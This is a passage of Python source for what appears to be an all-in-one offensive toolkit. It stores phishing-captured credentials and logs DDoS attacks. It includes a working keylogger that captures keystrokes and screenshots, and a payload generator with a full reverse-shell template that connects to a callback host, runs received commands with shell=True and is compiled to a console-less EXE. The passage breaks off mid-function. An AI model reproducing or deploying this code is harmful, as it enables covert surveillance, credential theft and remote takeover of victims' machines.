                       exit_code: int, execution_time: float):
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log traffic: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log Nikto scan: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_payloads'] = self.conn.execute("SELECT COUNT(*) FROM payloads").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_ddos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM ddos_attacks").fetchone()[0]
        except:
            pass
        return stats
    
    def verify_user(self, username: str, password: str) -> Optional[Dict]:
        try:
            import hashlib
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            row = self.conn.execute(
                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def create_session(self, user_id: int) -> str:
        try:
            session_id = secrets.token_urlsafe(32)
            expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
            self.conn.execute(
                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
                (session_id, user_id, expires_at.isoformat())
            )
            self.conn.commit()
            return session_id
        except:
            return None
    
    def verify_session(self, session_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                """SELECT s.*, u.username, u.role 
                   FROM sessions s 
                   JOIN users u ON s.user_id = u.id 
                   WHERE s.id = ? AND s.expires_at > datetime('now')""",
                (session_id,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def log_keylog(self, text: str, session_id: str = None, app_name: str = None,
                  hostname: str = None, screenshot_path: str = None):
        try:
            self.conn.execute(
                """INSERT INTO keylogs (text, session_id, app_name, hostname, screenshot_path)
                   VALUES (?, ?, ?, ?, ?)""",
                (text[:1000], session_id, app_name, hostname, screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log keylog: {e}")
    
    def get_keylogs(self, limit: int = 100, session_id: str = None) -> List[Dict]:
        try:
            if session_id:
                rows = self.conn.execute(
                    "SELECT * FROM keylogs WHERE session_id = ? ORDER BY timestamp DESC LIMIT ?",
                    (session_id, limit)
                )
            else:
                rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_spear_phishing(self, email_data: Dict) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO spear_phishing 
                   (id, target_email, subject, body, template, sent_at, status, opened, clicked, tracking_id)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (email_data['id'], email_data['target_email'], email_data['subject'],
                 email_data['body'], email_data.get('template', ''), email_data['sent_at'],
                 email_data.get('status', 'sent'), email_data.get('opened', 0),
                 email_data.get('clicked', 0), email_data['id'])
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save spear phishing: {e}")
            return False
    
    def get_spear_phishing(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM spear_phishing ORDER BY sent_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ddos_attack(self, target_ip: str, attack_type: str, port: int, duration: int,
                       threads: int, packets_sent: int, status: str, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO ddos_attacks 
                   (target_ip, attack_type, port, duration, threads, packets_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (target_ip, attack_type, port, duration, threads, packets_sent, status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log DDoS attack: {e}")
    
    def register_agent(self, agent_id: str, name: str, hostname: str, ip: str, os_info: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO agents (id, name, hostname, ip_address, os_info, last_seen, status)
                   VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP, 'online')""",
                (agent_id, name, hostname, ip, os_info)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def update_agent_heartbeat(self, agent_id: str):
        try:
            self.conn.execute(
                "UPDATE agents SET last_seen = CURRENT_TIMESTAMP, status = 'online' WHERE id = ?",
                (agent_id,)
            )
            self.conn.commit()
        except:
            pass
    
    def get_agents(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM agents ORDER BY last_seen DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_payload(self, payload: Payload) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO payloads 
                   (id, name, payload_type, file_path, created_at, deployed, deployment_count, callback_host, callback_port)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (payload.id, payload.name, payload.payload_type, payload.file_path,
                 payload.created_at, payload.deployed, payload.deployment_count,
                 payload.callback_host, payload.callback_port)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save payload: {e}")
            return False
    
    def get_payloads(self, payload_type: str = None) -> List[Dict]:
        try:
            if payload_type:
                rows = self.conn.execute("SELECT * FROM payloads WHERE payload_type = ? ORDER BY created_at DESC", (payload_type,))
            else:
                rows = self.conn.execute("SELECT * FROM payloads ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_payload_deployment(self, payload_id: str, deployment_type: str, target: str, status: str = "pending"):
        try:
            self.conn.execute(
                """INSERT INTO payload_deployments (payload_id, deployment_type, target, status)
                   VALUES (?, ?, ?, ?)""",
                (payload_id, deployment_type, target, status)
            )
            self.conn.execute(
                "UPDATE payloads SET deployment_count = deployment_count + 1, deployed = 1 WHERE id = ?",
                (payload_id,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
                           dest_port: int, protocol: str, size: int, payload: str = ""):
        try:
            self.conn.execute(
                """INSERT INTO network_packets 
                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save network packet: {e}")
    
    def get_network_packets(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_performance_metrics(self, cpu: float, memory: float, disk: float,
                               net_sent: int, net_recv: int, connections: int):
        try:
            self.conn.execute(
                """INSERT INTO performance_metrics 
                   (cpu_percent, memory_percent, disk_percent, network_sent, network_recv, connections_count)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (cpu, memory, disk, net_sent, net_recv, connections)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log performance metrics: {e}")
    
    def get_performance_metrics(self, limit: int = 60) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM performance_metrics ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def close(self):
        try:
            self.conn.close()
        except:
            pass

# =====================
# ADVANCED NETWORK SCANNER
# =====================
class AdvancedNetworkScanner:
    """Advanced network scanning with multiple techniques"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scan_results = {}
        self.active_scans = {}
        self.scan_lock = threading.Lock()
    
    def ping_scan(self, target: str, count: int = 4) -> CommandResult:
        """Perform ping scan on target"""
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def port_scan(self, target: str, ports: str = "1-1000", scan_type: str = "quick") -> CommandResult:
        """Perform port scan using nmap"""
        start_time = time.time()
        try:
            if not shutil.which('nmap'):
                return CommandResult(False, "nmap not installed", 0, "nmap not found")
            
            if scan_type == "quick":
                cmd = ['nmap', '-T4', '-F', target]
            elif scan_type == "full":
                cmd = ['nmap', '-p-', target]
            elif scan_type == "service":
                cmd = ['nmap', '-sV', target]
            elif scan_type == "os":
                cmd = ['nmap', '-O', target]
            elif scan_type == "udp":
                cmd = ['nmap', '-sU', target]
            elif scan_type == "vuln":
                cmd = ['nmap', '--script', 'vuln', target]
            elif scan_type == "stealth":
                cmd = ['nmap', '-sS', '-T2', target]
            elif scan_type == "comprehensive":
                cmd = ['nmap', '-sS', '-sV', '-O', '-p-', target]
            else:
                cmd = ['nmap', '-p', ports, target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def comprehensive_scan(self, target: str) -> Dict:
        """Comprehensive scan of a target (ping, port scan, OS detection, service detection)"""
        results = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'ping': None,
            'ports': None,
            'os': None,
            'services': None,
            'vulnerabilities': None
        }
        
        # Ping
        ping_result = self.ping_scan(target)
        results['ping'] = {
            'success': ping_result.success,
            'output': ping_result.output
        }
        
        # Port scan
        port_result = self.port_scan(target, "1-1000", "quick")
        results['ports'] = {
            'success': port_result.success,
            'output': port_result.output
        }
        
        # OS detection
        os_result = self.port_scan(target, "1-1000", "os")
        results['os'] = {
            'success': os_result.success,
            'output': os_result.output
        }
        
        # Service detection
        service_result = self.port_scan(target, "1-1000", "service")
        results['services'] = {
            'success': service_result.success,
            'output': service_result.output
        }
        
        return results
    
    def scan_all_ips(self, ips: List[str], scan_type: str = "quick") -> Dict:
        """Scan multiple IPs"""
        results = {}
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self.comprehensive_scan, ip): ip for ip in ips}
            for future in futures:
                ip = futures[future]
                try:
                    results[ip] = future.result()
                except Exception as e:
                    results[ip] = {'error': str(e)}
        return results
    
    def parse_nmap_output(self, output: str) -> Dict:
        """Parse nmap output for structured data"""
        parsed = {
            'open_ports': [],
            'os_info': None,
            'services': []
        }
        
        lines = output.split('\n')
        for line in lines:
            # Parse open ports
            if '/tcp' in line or '/udp' in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_proto = parts[0].split('/')
                    if len(port_proto) == 2:
                        try:
                            port = int(port_proto[0])
                            protocol = port_proto[1]
                            state = parts[1]
                            service = parts[2] if len(parts) > 2 else 'unknown'
                            
                            if state.lower() == 'open':
                                parsed['open_ports'].append({
                                    'port': port,
                                    'protocol': protocol,
                                    'service': service
                                })
                        except:
                            continue
            
            # Parse OS info
            elif 'OS:' in line:
                os_parts = line.split('OS:')
                if len(os_parts) > 1:
                    parsed['os_info'] = os_parts[1].strip()
        
        return parsed

# =====================
# ADVANCED KEYLOGGER
# =====================
class AdvancedKeylogger:
    """Advanced keylogger with screenshot capture and exfiltration"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.text = ""
        self.running = False
        self.listener = None
        self.thread = None
        self.last_log_time = time.time()
        self.last_screenshot_time = time.time()
        self.session_id = str(uuid.uuid4())[:8]
        self.hostname = socket.gethostname()
        self.screenshot_interval = config.get('keylogger_screenshot_interval', 60)
        self.interval = config.get('keylogger_interval', 30)
        self.port = config.get('keylogger_port', 4444)
        self.keylogs = []
        self.screenshot_counter = 0
        
    def start_keylogger(self):
        """Start the keylogger"""
        if not KEYLOGGER_AVAILABLE:
            print(f"{Colors.RED}❌ Keylogger not available (pynput required){Colors.RESET}")
            return False
        
        if self.running:
            print(f"{Colors.YELLOW}⚠️ Keylogger is already running{Colors.RESET}")
            return False
        
        print(f"{Colors.ORANGE}⌨️ Keylogger started! F10 to stop...{Colors.RESET}")
        self.running = True
        self.text = ""
        self.keylogs = []
        
        # Start the keylogger thread
        self.thread = threading.Thread(target=self._run_keylogger, daemon=True)
        self.thread.start()
        
        # Start screenshot capture thread
        self.screenshot_thread = threading.Thread(target=self._screenshot_capture_loop, daemon=True)
        self.screenshot_thread.start()
        
        return True
    
    def _run_keylogger(self):
        """Run the keylogger in a separate thread"""
        def on_press(key):
            if not self.running:
                return False
            
            try:
                if key == keyboard.Key.f10:
                    print(f"{Colors.YELLOW}🛑 Keylogger stopped by F10{Colors.RESET}")
                    self.stop_keylogger()
                    return False
                
                # Handle special keys
                if key == keyboard.Key.enter:
                    self.text += "\n"
                elif key == keyboard.Key.tab:
                    self.text += "\t"
                elif key == keyboard.Key.space:
                    self.text += " "
                elif key == keyboard.Key.backspace and len(self.text) > 0:
                    self.text = self.text[:-1]
                elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                           keyboard.Key.esc, keyboard.Key.shift_r, keyboard.Key.cmd,
                           keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.caps_lock]:
                    pass
                elif hasattr(key, 'char') and key.char is not None:
                    self.text += key.char
                    self.keylogs.append({
                        'char': key.char,
                        'timestamp': datetime.datetime.now().isoformat()
                    })
            except Exception as e:
                logger.error(f"Keylogger error: {e}")
            
            # Send keylog data periodically
            current_time = time.time()
            if current_time - self.last_log_time >= self.interval and self.text:
                self._save_keylog()
                self.text = ""
                self.last_log_time = current_time
        
        with keyboard.Listener(on_press=on_press) as listener:
            self.listener = listener
            listener.join()
    
    def _save_keylog(self):
        """Save keylog to database and file"""
        if not self.text:
            return
        
        screenshot_path = None
        try:
            # Check for latest screenshot
            screenshots = sorted(glob.glob(os.path.join(KEYLOG_SCREENSHOTS_DIR, f"screenshot_*.png")))
            if screenshots:
                screenshot_path = screenshots[-1]
        except:
            pass
        
        self.db.log_keylog(
            text=self.text,
            session_id=self.session_id,
            app_name="apex_keylogger",
            hostname=self.hostname,
            screenshot_path=screenshot_path
        )
        
        # Save to file
        log_file = os.path.join(KEYLOG_DIR, f"keylog_{self.session_id}_{int(time.time())}.txt")
        with open(log_file, 'a') as f:
            f.write(f"[{datetime.datetime.now().isoformat()}] [{self.hostname}]\n{self.text}\n\n")
        
        print(f"{Colors.BLUE}📝 Keylog saved: {len(self.text)} chars{Colors.RESET}")
    
    def _screenshot_capture_loop(self):
        """Capture screenshots periodically"""
        while self.running:
            try:
                current_time = time.time()
                if current_time - self.last_screenshot_time >= self.screenshot_interval:
                    self._capture_screenshot()
                    self.last_screenshot_time = current_time
                time.sleep(5)
            except Exception as e:
                logger.error(f"Screenshot error: {e}")
                time.sleep(10)
    
    def _capture_screenshot(self) -> Optional[str]:
        """Capture a screenshot"""
        try:
            import pyautogui
            self.screenshot_counter += 1
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(
                KEYLOG_SCREENSHOTS_DIR,
                f"screenshot_{self.session_id}_{timestamp}_{self.screenshot_counter}.png"
            )
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            print(f"{Colors.PURPLE}📸 Screenshot captured: {screenshot_path}{Colors.RESET}")
            return screenshot_path
        except ImportError:
            print(f"{Colors.YELLOW}⚠️ pyautogui not installed. Screenshot capture disabled.{Colors.RESET}")
            return None
        except Exception as e:
            logger.error(f"Screenshot capture error: {e}")
            return None
    
    def stop_keylogger(self):
        """Stop the keylogger"""
        self.running = False
        
        # Save remaining text
        if self.text:
            self._save_keylog()
        
        if self.listener:
            try:
                self.listener.stop()
            except:
                pass
        
        print(f"{Colors.GREEN}✅ Keylogger stopped{Colors.RESET}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        """Get keylogs from database"""
        return self.db.get_keylogs(limit, self.session_id)
    
    def get_screenshots(self) -> List[str]:
        """Get captured screenshots"""
        try:
            return sorted(glob.glob(os.path.join(KEYLOG_SCREENSHOTS_DIR, f"screenshot_{self.session_id}_*.png")))
        except:
            return []
    
    def get_session_info(self) -> Dict:
        """Get session information"""
        return {
            'session_id': self.session_id,
            'hostname': self.hostname,
            'running': self.running,
            'interval': self.interval,
            'screenshot_interval': self.screenshot_interval,
            'port': self.port,
            'keylog_count': len(self.keylogs),
            'screenshot_count': self.screenshot_counter
        }

# =====================
# IP MONITOR MODULE
# =====================
class IPMonitor:
    """Advanced IP monitoring with automatic scanning and threat detection"""
    
    def __init__(self, db: DatabaseManager, scanner: AdvancedNetworkScanner):
        self.db = db
        self.scanner = scanner
        self.monitored_ips = {}
        self.running = False
        self.scan_interval = 300
        self.max_ips = 10000
        self.monitor_thread = None
        self.alert_callbacks = []
    
    def start_monitoring(self):
        """Start the IP monitoring loop"""
        if self.running:
            return
        
        self.running = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.monitor_thread.start()
        print(f"{Colors.BLUE}🛡️ IP Monitor started{Colors.RESET}")
    
    def stop_monitoring(self):
        """Stop the IP monitoring loop"""
        self.running = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        print(f"{Colors.YELLOW}⏹️ IP Monitor stopped{Colors.RESET}")
    
    def _monitor_loop(self):
        """Main monitoring loop"""
        while self.running:
            try:
                self._scan_monitored_ips()
                time.sleep(self.scan_interval)
            except Exception as e:
                logger.error(f"IP monitor error: {e}")
                time.sleep(60)
    
    def _scan_monitored_ips(self):
        """Scan all monitored IPs"""
        ips = self.db.get_managed_ips()
        for ip_data in ips:
            ip = ip_data['ip_address']
            try:
                self._scan_ip(ip)
            except Exception as e:
                logger.error(f"Failed to scan IP {ip}: {e}")
    
    def _scan_ip(self, ip: str):
        """Scan a specific IP and update its status"""
        try:
            # Comprehensive scan
            results = self.scanner.comprehensive_scan(ip)
            
            # Parse results
            open_ports = []
            closed_ports = []
            hostname = None
            os_info = None
            
            # Parse port scan output
            port_output = results.get('ports', {}).get('output', '')
            parsed = self.scanner.parse_nmap_output(port_output)
            open_ports = parsed.get('open_ports', [])
            os_info = parsed.get('os_info')
            
            # Try to get hostname
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                pass
            
            # Determine threat level
            threat_level = self._determine_threat_level(open_ports)
            
            # Update database
            self.db.update_ip_scan(
                ip=ip,
                open_ports=[p['port'] for p in open_ports if isinstance(p, dict)],
                closed_ports=[],
                threat_level=threat_level,
                hostname=hostname,
                os_info=os_info
            )
            
            # Check for threats
            self._check_threats(ip, open_ports, threat_level)
            
        except Exception as e:
            logger.error(f"IP scan error for {ip}: {e}")
    
    def _determine_threat_level(self, open_ports: List) -> str:
        """Determine threat level based on open ports"""
        if not open_ports:
            return 'low'
        
        sensitive_ports = [21, 22, 23, 25, 445, 3389, 5900, 3306, 1433]
        sensitive_found = [p for p in open_ports if p in sensitive_ports]
        
        if len(open_ports) > 10:
            return 'critical'
        elif len(open_ports) > 5:
            return 'high'
        elif sensitive_found:
            return 'medium'
        else:
            return 'low'
    
    def _check_threats(self, ip: str, open_ports: List, threat_level: str):
        """Check for threats and trigger alerts"""
        sensitive_ports = [21, 22, 23, 25, 445, 3389, 5900, 3306, 1433]
        sensitive_found = [p for p in open_ports if p in sensitive_ports]
        
        if sensitive_found:
            alert = ThreatAlert(
                timestamp=datetime.datetime.now().isoformat(),
                threat_type="Sensitive Ports Open",
                source_ip=ip,
                severity="high",
                description=f"Sensitive ports open: {sensitive_found}",
                action_taken="Logged"
            )
            self.db.log_threat(alert.threat_type, alert.source_ip, alert.severity, alert.description)
            self._trigger_alert(alert)
        
        if threat_level in ['high', 'critical']:
            alert = ThreatAlert(
                timestamp=datetime.datetime.now().isoformat(),
                threat_type="High Threat Level Detected",
                source_ip=ip,
                severity=threat_level,
                description=f"Threat level: {threat_level.upper()}",
                action_taken="Logged"
            )
            self.db.log_threat(alert.threat_type, alert.source_ip, alert.severity, alert.description)
            self._trigger_alert(alert)
    
    def _trigger_alert(self, alert: ThreatAlert):
        """Trigger alert callbacks"""
        for callback in self.alert_callbacks:
            try:
                callback(alert)
            except Exception as e:
                logger.error(f"Alert callback error: {e}")
    
    def add_alert_callback(self, callback: Callable):
        """Add an alert callback function"""
        self.alert_callbacks.append(callback)
    
    def add_ip(self, ip: str, notes: str = "") -> bool:
        """Add an IP to monitoring"""
        try:
            ipaddress.ip_address(ip)
            ips = self.db.get_managed_ips()
            if len(ips) >= self.max_ips:
                return False
            
            # Try to get hostname
            hostname = None
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                pass
            
            return self.db.add_managed_ip(ip, hostname=hostname, added_by="monitor", notes=notes)
        except:
            return False
    
    def remove_ip(self, ip: str) -> bool:
        """Remove an IP from monitoring"""
        try:
            self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
            self.db.conn.commit()
            return True
        except:
            return False
    
    def get_all_ips(self) -> List[Dict]:
        """Get all monitored IPs"""
        return self.db.get_managed_ips()
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        """Get detailed IP information"""
        return self.db.get_ip_info(ip)
    
    def scan_ip_now(self, ip: str) -> Dict:
        """Immediately scan an IP"""
        self._scan_ip(ip)
        return self.get_ip_info(ip) or {}

# =====================
# PAYLOAD GENERATOR
# =====================
class PayloadGenerator:
    """Generate and deploy payloads (EXE, PDF, DOCX, Link, Network)"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.callback_host = config.get('payload.default_callback', 'localhost')
        self.callback_port = config.get('payload.default_port', 4444)
    
    def generate_exe(self, name: str, callback_host: str = None, callback_port: int = None) -> Payload:
        """Generate an EXE payload"""
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        payload_id = str(uuid.uuid4())[:8]
        file_name = f"{name}_{payload_id}.exe"
        file_path = os.path.join(EXE_PAYLOADS_DIR, file_name)
        
        template = self._get_exe_template()
        template = template.replace("{CALLBACK_HOST}", callback_host)
        template = template.replace("{CALLBACK_PORT}", str(callback_port))
        
        with open(file_path, 'w') as f:
            f.write(template)
        
        if PYINSTALLER_AVAILABLE:
            try:
                subprocess.run([
                    'pyinstaller', '--onefile', '--noconsole', '--name', file_name.replace('.exe', ''),
                    '--distpath', EXE_PAYLOADS_DIR, '--workpath', TEMP_DIR, file_path
                ], capture_output=True, timeout=60)
                exe_file = os.path.join(EXE_PAYLOADS_DIR, file_name.replace('.exe', ''), file_name)
                if os.path.exists(exe_file):
                    shutil.move(exe_file, file_path)
                    shutil.rmtree(os.path.join(EXE_PAYLOADS_DIR, file_name.replace('.exe', '')))
            except:
                pass
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="exe",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        self.db.save_payload(payload)
        return payload
    
    def _get_exe_template(self) -> str:
        """Get EXE payload template"""
        return '''#!/usr/bin/env python3
import socket
import subprocess
import sys
import time
import os
import json
import platform
import uuid
import requests

CALLBACK_HOST = "{CALLBACK_HOST}"
CALLBACK_PORT = {CALLBACK_PORT}
AGENT_ID = str(uuid.uuid4())[:8]

def get_system_info():
    return {
        "agent_id": AGENT_ID,
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "user": os.getlogin(),
        "pid": os.getpid()
    }

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return {
            "success": result.returncode == 0,
            "output": result.stdout if result.stdout else result.stderr,
            "exit_code": result.returncode
        }
    except Exception as e:
        return {"success": False, "output": str(e), "exit_code": -1}

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((CALLBACK_HOST, CALLBACK_PORT))
        sock.send(json.dumps(get_system_info()).encode())
        
        while True:
            data = sock.recv(4096).decode('utf-8')
            if not data:
                break
            command = json.loads(data)
            result = execute_command(command.get('cmd', ''))
            sock.send(json.dumps(result).encode('utf-8'))
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
'''
    
    def generate_pdf(self, name: str) -> Payload:
        """Generate a PDF payload"""
        payload_id = str(uuid.uuid4())[:8]
        file_name = f"{name}_{payload_id}.pdf"
        file_path = os.path.join(PDF_PAYLOADS_DIR, file_name)
        
        # Simple PDF with JS
        pdf_content = '''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS (
  app.alert("This document is protected");
) >>
endobj
4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
endobj
5 0 obj
<< /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (APEX Security) Tj ET
endstream
endobj
xref
0 6
trailer << /Root 1 0 R >>
%%EOF
'''
        with open(file_path, 'w') as f:
            f.write(pdf_content)
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="pdf",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_payload(payload)
        return payload
    
    def list_payloads(self, payload_type: str = None) -> List[Dict]:
        return self.db.get_payloads(payload_type)

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
    
    def is_available(self) -> bool:
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path,
            created_at=datetime.datetime.now().isoformat()
        )
        self.db.add_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        if not self.is_available():
            return False
        
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
